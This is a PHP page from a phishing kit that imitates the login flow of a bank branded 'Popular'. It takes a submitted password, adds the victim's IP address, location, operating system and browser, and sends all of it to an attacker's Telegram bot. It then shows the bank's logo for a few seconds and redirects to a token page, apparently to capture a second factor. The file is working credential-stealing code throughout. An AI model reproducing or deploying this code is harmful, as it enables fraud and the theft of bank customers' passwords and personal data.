<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('tlgm.php');
include('funciones.php');
////////////////////

if ( isset ($_POST['passwd'])){


$message = "✔️✔️POPULAR✔️✔️\r\nCL4V3: ".$_POST['passwd']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}

?>
<!DOCTYPE html>
<html lang="es" class="hydrated show-recaptcha">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Popular</title>
    <base href=".">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta name="robots" content="index follow">

<meta http-equiv="refresh" content="3;url=token.php">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="msapplication-tap-highlight" content="no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Cache-control" content="private, no-cache, no-store, must-revalidate">
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./commad/styles.a9fefd8dc42981f33a92.css">
    <style type="text/css" id="operaUserStyle"></style>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .contenedor {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        .logo {
            max-width: 100%;
            height: auto;
            transition: opacity 0.5s ease-in-out;
        }

        .logo.visible {
            opacity: 1;
        }

        .logo.oculto {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="contenedor">
        <img src="./commad/logotipo-horizontalx3.png" alt="Logo de tu página" class="logo visible" id="logo">
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            var logo = document.getElementById("logo");

            setTimeout(function () {
                logo.classList.add("oculto");
            }, 2000);
        });
    </script>
</body>
</html>
